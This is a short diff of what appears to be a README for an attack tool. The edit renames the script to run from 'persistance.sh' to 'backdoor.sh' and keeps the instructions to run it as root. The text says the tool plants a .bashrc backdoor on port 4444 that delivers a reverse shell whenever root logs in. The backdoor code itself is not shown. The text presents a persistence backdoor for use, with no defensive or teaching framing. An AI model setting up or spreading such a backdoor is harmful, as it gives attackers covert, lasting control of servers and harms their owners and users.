@@ -2,7 +2,7 @@ Run this Script as Root !
 
 chmod +x backdoor.sh 
 
-./persistance.sh 
+./backdoor.sh 
 
 PORT 4444 Bashrc backdoor 
 everytime someone logs in as root on the server you will recive a reverseshell 
